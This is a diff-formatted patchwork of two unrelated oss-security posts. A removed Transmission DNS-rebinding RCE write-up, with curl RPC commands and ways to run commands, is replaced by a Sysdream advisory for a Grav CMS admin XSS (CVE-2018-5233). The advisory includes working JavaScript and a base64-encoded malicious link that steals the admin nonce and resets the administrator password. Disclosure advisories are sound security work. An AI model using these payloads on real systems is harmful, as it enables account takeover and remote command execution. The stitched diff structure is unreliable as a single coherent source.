@@ -1,105 +1,152 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/01/12/1
-Message-ID: <CAJ_zFkLv4TXc1ty6uX+ajrBcaU=0y612bnatryBSt1usp2gEhA@mail.gmail.com>
-Date: Thu, 11 Jan 2018 18:48:20 -0800
-From: Tavis Ormandy <taviso@...gle.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: transmission: rpc session-id mechanism design flaw results in RCE
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/03/15/1
+Message-ID: <21d7c459-7914-7c43-2c0a-b16085a94f2f@sysdream.com>
+Date: Thu, 15 Mar 2018 10:46:12 +0100
+From: Sydream Labs <labs@...dream.com>
+To: fulldisclosure@...lists.org, oss-security@...ts.openwall.com
+Subject: [CVE-2018-5233] Grav CMS admin plugin Reflected Cross Site Scripting (XSS) vulnerability
 Content-Type: text/plain; charset=utf-8
 
-Here is an updated version of the patch (some tests were failing):
+# [CVE-2018-5233] Grav CMS admin plugin Reflected Cross Site Scripting
+(XSS) vulnerability
 
-https://patch-diff.githubusercontent.com/raw/transmission/transmission/pull/468.diff
+## Description
 
-On Thu, Jan 11, 2018 at 10:47 AM, Tavis Ormandy <taviso@...gle.com> wrote:
+Grav CMS is a flat-file CMS using Markdown files for content management
+([Official Website](https://getgrav.org/)).
 
-> Hello, the transmission bittorrent client uses a client/server
-> architecture, the user interface is the client and a daemon runs in the
-> background managing the downloading, seeding, etc.
->
-> Clients interact with the daemon using JSON RPC requests to a web server
-> listening on port 9091. The daemon will only accept requests from localhost
-> by default, but it's common to configure NAS devices to accept remote
-> clients.
->
-> A sample RPC session looks like this:
->
-> $ curl -sI http://localhost:9091/transmission/rpc
-> HTTP/1.1 409 Conflict
-> Server: Transmission
-> X-Transmission-Session-Id: JL641xTn2h53UsN6bVa0kJjRBLA6oX
-> 1Ayl06AJwuhHvSgE6H
-> Date: Wed, 29 Nov 2017 21:37:41 GMT
->
-> $ curl -H 'X-Transmission-Session-Id: JL641xTn2h53UsN6bVa0kJjRBLA6oX1Ayl06AJwuhHvSgE6H'
->  -d '{"method":"session-set","arguments":{"download-dir":"/home/user"}}'
-> -si http://localhost:9091/transmission/rpc
-> HTTP/1.1 200 OK
-> Server: Transmission
-> Content-Type: application/json; charset=UTF-8
-> Date: Wed, 29 Nov 2017 21:38:57 GMT
-> Content-Length: 36
->
-> {"arguments":{},"result":"success"}
->
-> As with all HTTP RPC schemes like this, any website can send requests to
-> the daemon listening on localhost with XMLHttpRequest(), but the theory is
-> they will be ignored because clients must prove they can read and set a
-> specific header, X-Transmission-Session-Id.
->
-> Unfortunately, this design doesn't work because of an attack called "DNS
-> rebinding". Any website can simply create a dns name that they are
-> authorized to communicate with, and then make it resolve to localhost.
->
-> The attack works like this:
->
-> 1. A user visits http://attacker.com, which has an <iframe> to a
-> subdomain the attacker controls.
-> 2. The attacker configures their DNS server to respond alternately with
-> 127.0.0.1 and 123.123.123.123 (an address they control) with a very low TTL.
-> 3. When the browser resolves to 123.123.123.123, they serve HTML that
-> waits for the DNS entry to expire (or force it to expire by flooding the
-> cache with lookups), then they have permission to read and set headers.
->
-> I have a domain I use for testing dns rebinding called rbndr.us, you can
-> use this page to generate hostnames (source code is here:
-> https://github.com/taviso/rbndr):
->
-> https://lock.cmpxchg8b.com/rebinder.html
->
-> Here I want to alternate between 127.0.0.1 and 199.241.29.227, so I use
-> 7f000001.c7f11de3.rbndr.us:
->
-> $ host 7f000001.c7f11de3.rbndr.us
-> 7f000001.c7f11de3.rbndr.us has address 127.0.0.1
-> $ host 7f000001.c7f11de3.rbndr.us
-> 7f000001.c7f11de3.rbndr.us has address 199.241.29.227
-> $ host 7f000001.c7f11de3.rbndr.us
-> 7f000001.c7f11de3.rbndr.us has address 127.0.0.1
->
-> Here you can see the resolution alternates between the two addresses I
-> want (note that depending on caching it might take a while to switch, the
-> TTL is set to minimum but some servers round up).
->
-> I just wait for the cached response to expire, and then POST commands to
-> the server.
->
-> Exploitation is simple, you could set script-torrent-done-enabled and run
-> any command, or set download-dir to /home/user/ and then upload a torrent
-> for ".bashrc".
->
-> Here is my (simple) demo, it's slow, but could be made very fast:
->
-> http://lock.cmpxchg8b.com/Asoquu3e.html
->
-> I've verified it works on Chrome and Firefox on Windows and Linux (I tried
-> Fedora and Ubuntu), I expect other platforms and browsers are affected. There
-> are screenshots of how the attack is supposed to look on the bug report
-> here:
->
-> https://github.com/transmission/transmission/pull/468
->
-> Tavis.
->
->
+It has been elected "Best Open Source CMS of 2016" by [CMS
+critic](https://www.cmscritic.com/the-winner-of-best-open-source-cms-for-2016-is-grav/).
 
+The application does not always filter user input correctly, thereby
+allowing an attacker to inject arbitrary Web content in the response of
+the server (reflected Cross Site Scripting).
+
+**CVE ID**: CVE-2018-5233
+
+**Access Vector**: remote
+
+**Security Risk**: high
+
+**Vulnerability**: CWE-79
+
+**CVSS Base Score**: 7.4
+
+**CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N
+
+
+## Details
+
+On lines 355 and 358 of `system/src/Grav/Common/Twig/Twig.php`,
+unfiltered user input is passed in the `$error_msg` variable.
+
+```
+$output = $this->twig->render($template, $twig_vars);
+} catch (\Twig_Error_Loader $e) {
+
+.. snip ..
+
+            throw new \RuntimeException($error_msg, 400, $e);
+        }
+    } else {
+        throw new \RuntimeException($error_msg, 400, $e);
+    }
+}
+```
+
+As a result, generating an exception by accessing
+`/admin/tools/someunexistingpage` and manipulating the
+`someunexistingpage` part of the URL allows to inject arbitrary Web
+content into the server's response.
+
+## Proof of Concept #1
+
+Visiting the following page:
+
+```
+/admin/tools/a--%3E%3Cimg%20src=x%20onerror=alert(1)%3E
+```
+
+will cause the execution of the `alert(1)` JavaScript code in the
+context of the visitor's browser.
+
+## Proof of Concept #2
+
+By tricking a logged-in admin into visiting a malicious link, any
+unauthenticated user can elevate its privileges to site administration.
+
+Here follows a Proof of Concept code which:
+
+1. Grabs the `admin-nonce` of the logged-in admin
+2. Prints that nonce
+3. Uses it to change the current admin's password to `Password7`
+
+```
+<script
+src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+<script>
+adminNonce = "";
+$.get( "/admin/user/admin",
+function( data ) {adminNonce = $("input[name=admin-nonce]",
+data).val()}).done(
+function(){
+alert(window.adminNonce);
+$.post( "/admin/user/admin", {
+    "task": "save",
+        "admin-nonce": adminNonce,
+    "data[password]": "Password7"},
+    function(data){document.write(data)})}
+);
+</script>
+```
+
+Here is the base64 encoded version of the payload, injected in the
+malicious link:
+
+```
+http://example.site.com/admin/tools/a--%3E%3Cimg%20src=x%20onerror=document['write'](atob('PHNjcmlwdCBzcmM9Imh0dHBzOi8vYWpheC5nb29nbGVhcGlzLmNvbS9hamF4L2xpYnMvanF1ZXJ5LzMuMi4xL2pxdWVyeS5taW4uanMiPjwvc2NyaXB0PjxzY3JpcHQ+YWRtaW5Ob25jZSA9ICIiOyQuZ2V0KCAiL2FkbWluL3VzZXIvYWRtaW4iLCBmdW5jdGlvbiggZGF0YSApIHthZG1pbk5vbmNlID0gJCgiaW5wdXRbbmFtZT1hZG1pbi1ub25jZV0iLCBkYXRhKS52YWwoKX0pLmRvbmUoZnVuY3Rpb24oKXthbGVydCh3aW5kb3cuYWRtaW5Ob25jZSk7JC5wb3N0KCAiL2FkbWluL3VzZXIvYWRtaW4iLCB7ICJ0YXNrIjogInNhdmUiLCAiYWRtaW4tbm9uY2UiOiBhZG1pbk5vbmNlLCJkYXRhW3Bhc3N3b3JkXSI6ICJQYXNzd29yZDcifSwgZnVuY3Rpb24oZGF0YSl7ZG9jdW1lbnQud3JpdGUoZGF0YSl9KX0pOzwvc2NyaXB0Pgo='))%3E
+```
+
+Now, after the attacker tricks a logged-in admin into clicking on this
+link, the admin's password is changed to the attacker controlled value.
+Thus, the attacker can log in with `Password7` and navigate inside the
+administration interface.
+
+
+## Timeline (dd/mm/yyyy)
+
+* 01/07/2017 : Initial discovery
+* 01/07/2017 : Contact with the editor (email address)
+* 02/07/2017 : Editor acknowledges the report
+* 02/07/2017 : Sending further details and PoC code to the editor
+* 04/07/2017 : Editor fixes the vulnerability
+* 15/03/2018 : Advisory publication
+
+## Fixes
+
+Upgrade to version 1.3.0 and above (currently 1.3.10)
+
+## Affected versions
+
+* Version 1.2.4 (last stable version as of 02/07/2017 - previous
+versions are probably also vulnerable but not tested)
+
+## Credits
+
+* Kevin LOCATI <k.locati@...dream.com>
+
+
+-- 
+SYSDREAM Labs <labs@...dream.com>
+
+GPG :
+47D1 E124 C43E F992 2A2E
+1551 8EB4 8CD9 D5B2 59A1
+
+* Website: https://sysdream.com/
+* Twitter: @sysdream
+
+
+
+Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
